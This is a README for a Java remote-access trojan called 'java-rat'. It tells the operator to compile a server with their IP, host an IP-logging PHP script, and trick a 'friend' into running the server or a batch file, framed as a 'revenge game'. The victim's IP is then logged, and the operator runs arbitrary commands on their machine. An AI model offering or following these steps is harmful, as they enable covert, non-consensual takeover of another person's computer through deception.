java-rat
========

## Remote Administration Tool

## As simple as compiling and executing java.
### Setting up your environment

    Compile the TestServer.java with ip address in source as mentioned in it.
    Comiple the TestClient.java.
    Copy ip.php and ip.txt files to your webserver root folder.

### Now revenge game

    Send the TestServer.class to your friend and ask him to execute or write a batch script and ask him to double click.
    Now in your web server, a file with ip.txt is filled with his IP address.
    Open terminal and go to folder path of TestClient.class and execute as given below: java TestClient IP-Address-of-your-friend
    Now a command prompt will be asking to execute commands which are executed on your friend system.

Now enjoy the game......

Any doubts and feedback contact me @ kakumanivrn@gmail.com
